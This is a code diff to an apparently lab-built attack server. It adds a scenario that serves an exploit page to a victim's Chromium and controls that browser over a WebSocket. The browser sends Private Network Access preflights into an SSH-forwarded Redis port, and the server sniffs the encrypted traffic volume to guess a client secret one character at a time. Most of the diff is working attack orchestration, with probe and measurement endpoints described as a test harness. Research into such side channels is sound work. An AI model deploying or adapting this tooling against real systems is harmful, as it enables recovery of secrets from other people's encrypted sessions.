@@ -33,8 +33,14 @@ from scapy.layers.inet import IP, TCP  # type: ignore
 from attacker.attack.adapters.browser_bridge import BrowserBridge
 
 from attacker.attack.engine import run_attack as run_unified_attack
-from attacker.attack.adapters.direct import DirectAdapter
+from attacker.attack.alignment import make_alignment
+from attacker.attack.adapters.direct import DirectAdapter, _sum_c2s
 from attacker.attack.adapters.browser import BrowserAdapter
+from attacker.attack.adapters.browser_pna import (
+    BrowserPnaAdapter,
+    _make_url_safe_filler,
+    _assert_url_path_safe,
+)
 from attacker.attack.adapters.ansible import AnsibleAdapter
 
 LOG = logging.getLogger("attacker")
@@ -76,7 +82,11 @@ class PacketLog:
 
 
 PACKET_LOG = PacketLog()
+# One bridge per browser: the Firefox `browser` scenario registers on /ws, the
+# PNA Chromium `browser_pna` scenario on /ws_pna, so the two exploit pages never
+# race for the same WebSocket and each scenario routes to its own browser.
 BROWSER_BRIDGE = BrowserBridge()
+BROWSER_PNA_BRIDGE = BrowserBridge()
 
 
 def _on_packet(pkt) -> None:
@@ -171,6 +181,7 @@ async def handle_status(request: web.Request) -> web.Response:
         "sniff_filter": SNIFF_FILTER,
         "packet_log_len": len(PACKET_LOG),
         "browser_connected": BROWSER_BRIDGE.connected,
+        "browser_pna_connected": BROWSER_PNA_BRIDGE.connected,
     })
 
 
@@ -223,6 +234,11 @@ async def handle_exploit(request: web.Request) -> web.Response:
         return web.Response(text=f.read(), content_type="text/html")
 
 
+async def handle_exploit_pna(request: web.Request) -> web.Response:
+    with open("/app/exploit_pna.html") as f:
+        return web.Response(text=f.read(), content_type="text/html")
+
+
 async def handle_ws(request: web.Request) -> web.WebSocketResponse:
     # heartbeat=30 sends a WebSocket ping every 30s; if the browser doesn't
     # pong back, aiohttp closes the connection so a half-open bridge gets
@@ -247,9 +263,32 @@ async def handle_ws(request: web.Request) -> web.WebSocketResponse:
     return ws
 
 
+async def handle_ws_pna(request: web.Request) -> web.WebSocketResponse:
+    """WebSocket endpoint for the PNA Chromium (exploit_pna.html). Mirrors
+    handle_ws but drives the separate BROWSER_PNA_BRIDGE."""
+    ws = web.WebSocketResponse(heartbeat=30)
+    await ws.prepare(request)
+
+    BROWSER_PNA_BRIDGE.set_ws(ws)
+    LOG.info("PNA browser connected via WebSocket")
+
+    try:
+        async for msg in ws:
+            if msg.type == aiohttp.WSMsgType.TEXT:
+                BROWSER_PNA_BRIDGE.on_message(msg.json())
+            elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
+                break
+    finally:
+        BROWSER_PNA_BRIDGE.clear_ws()
+        LOG.info("PNA browser disconnected")
+
+    return ws
+
+
 _ADAPTER_BY_SCENARIO: dict[str, Any] = {
     "direct": DirectAdapter,
     "browser": BrowserAdapter,
+    "browser_pna": BrowserPnaAdapter,
     "ansible": AnsibleAdapter,
 }
 
@@ -270,6 +309,8 @@ def _build_adapter(adapter_cls: Any, scenario: str) -> Any:
         return adapter_cls(packet_log=PACKET_LOG)
     if scenario == "browser":
         return adapter_cls(packet_log=PACKET_LOG, bridge=BROWSER_BRIDGE)
+    if scenario == "browser_pna":
+        return adapter_cls(packet_log=PACKET_LOG, bridge=BROWSER_PNA_BRIDGE)
     if scenario == "ansible":
         return adapter_cls(packet_log=PACKET_LOG)
     raise NotImplementedError(f"adapter construction not wired for scenario {scenario!r}")
@@ -303,6 +344,13 @@ async def handle_run_attack(request: web.Request) -> web.Response:
         except asyncio.TimeoutError:
             return web.json_response(
                 {"ok": False, "error": "browser not connected"}, status=503,
+            )
+    if scenario == "browser_pna" and not BROWSER_PNA_BRIDGE.connected:
+        try:
+            await BROWSER_PNA_BRIDGE.wait_ready(timeout=10)
+        except asyncio.TimeoutError:
+            return web.json_response(
+                {"ok": False, "error": "PNA browser not connected"}, status=503,
             )
     if _ATTACK_LOCK.locked():
         return web.json_response(
@@ -356,6 +404,120 @@ async def handle_cancel(request: web.Request) -> web.Response:
     return web.json_response({"ok": True, "cancelled": True, "was_running": was_running})
 
 
+async def handle_pna_probe(request: web.Request) -> web.Response:
+    """Test-harness probe for the browser_pna scenario.
+
+    Fires two PNA preflights through the victim's Chromium at the loopback
+    Redis forward -- a short path and a long (filler-padded) path -- and
+    returns, for each: the browser's ``rejected`` flag (the fetch was blocked,
+    evidence a real CORS/PNA preflight was sent and denied) and the c->s SSH
+    wire bytes the sniffer captured. The guess bytes ride inside the encrypted
+    SSH forward, so the sniffer cannot read the OPTIONS plaintext; instead the
+    caller asserts (a) the preflight was blocked and (b) the c->s volume scales
+    with the path length -- i.e. the attacker-controlled path bytes are what
+    traverse the forward, not merely "some packets appeared". Used by
+    scripts/verify_browser_pna.py.
+    """
+    if _ATTACK_LOCK.locked():
+        return web.json_response(
+            {"ok": False, "error": "another attack is in progress"}, status=409,
+        )
+    if not BROWSER_PNA_BRIDGE.connected:
+        try:
+            await BROWSER_PNA_BRIDGE.wait_ready(timeout=10)
+        except asyncio.TimeoutError:
+            return web.json_response(
+                {"ok": False, "error": "PNA browser not connected"}, status=503,
+            )
+
+    body: dict[str, Any] = {}
+    if request.body_exists:
+        try:
+            body = await request.json()
+        except Exception:  # noqa: BLE001
+            body = {}
+    marker = str(body.get("marker", "PROBEMARKER"))
+    prefill = int(body.get("prefill_bytes", 8192))
+    settle = float(body.get("settle", 0.2))
+    marker_b = marker.encode("latin-1")
+
+    async def _one(path_bytes: bytes) -> dict:
+        _assert_url_path_safe(path_bytes)
+        PACKET_LOG.clear()
+        report = await BROWSER_PNA_BRIDGE.inject_preflight(path_bytes)
+        await asyncio.sleep(settle)
+        c2s = _sum_c2s(PACKET_LOG.snapshot(), 0)
+        return {
+            "path_len": len(path_bytes),
+            "c2s_bytes": c2s,
+            "rejected": bool(report.get("rejected")) if report else None,
+            "error": (report or {}).get("error", ""),
+        }
+
+    try:
+        small = await _one(marker_b)
+        large = await _one(_make_url_safe_filler(prefill) + marker_b)
+    except Exception as exc:  # noqa: BLE001
+        LOG.exception("pna_probe failed")
+        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+
+    return web.json_response({
+        "ok": True,
+        "marker": marker,
+        "prefill_bytes": prefill,
+        "small": small,
+        "large": large,
+    })
+
+
+async def handle_pna_measure(request: web.Request) -> web.Response:
+    """Diagnostic: run ONE browser_pna measure_once and return the raw c->s
+    byte count, for empirically deriving prefill / margin / threshold / pool.
+    Test harness only (see scripts/ dev probes). Body:
+      {"prefix": "ma", "candidate": "z", "alignment": 3, "config": {...}}
+    The currently-set client secret is used, so set it first via /set_secret.
+    """
+    if _ATTACK_LOCK.locked():
+        return web.json_response(
+            {"ok": False, "error": "another attack is in progress"}, status=409,
+        )
+    if not BROWSER_PNA_BRIDGE.connected:
+        try:
+            await BROWSER_PNA_BRIDGE.wait_ready(timeout=10)
+        except asyncio.TimeoutError:
+            return web.json_response(
+                {"ok": False, "error": "PNA browser not connected"}, status=503,
+            )
+    body: dict[str, Any] = {}
+    if request.body_exists:
+        try:
+            body = await request.json()
+        except Exception:  # noqa: BLE001
+            body = {}
+    prefix = str(body.get("prefix", ""))
+    candidate = str(body.get("candidate", "a"))
+    al = int(body.get("alignment", 0))
+    overrides = dict(body.get("config", {}) or {})
+
+    cfg = BrowserPnaAdapter.default_config().overlay(overrides)
+    adapter = BrowserPnaAdapter(packet_log=PACKET_LOG, bridge=BROWSER_PNA_BRIDGE)
+    await adapter.setup(cfg, request.app["http"])
+    try:
+        alignment = make_alignment(al, cfg.alignment_pool)
+        c2s = await adapter.measure_once(
+            prefix.encode("latin-1"), candidate.encode("latin-1"), alignment,
+        )
+    except Exception as exc:  # noqa: BLE001
+        LOG.exception("pna_measure failed")
+        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+    finally:
+        await adapter.teardown()
+    return web.json_response({
+        "ok": True, "c2s": c2s,
+        "prefix": prefix, "candidate": candidate, "alignment": al,
+    })
+
+
 async def main() -> int:
     logging.basicConfig(
         level=logging.INFO,
@@ -383,8 +545,12 @@ async def main() -> int:
     app.router.add_post("/trigger_payload", handle_trigger_payload)
     app.router.add_post("/run_attack", handle_run_attack)
     app.router.add_post("/cancel", handle_cancel)
+    app.router.add_post("/pna_probe", handle_pna_probe)
+    app.router.add_post("/pna_measure", handle_pna_measure)
     app.router.add_get("/exploit", handle_exploit)
+    app.router.add_get("/exploit_pna", handle_exploit_pna)
     app.router.add_get("/ws", handle_ws)
+    app.router.add_get("/ws_pna", handle_ws_pna)
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", HTTP_PORT)
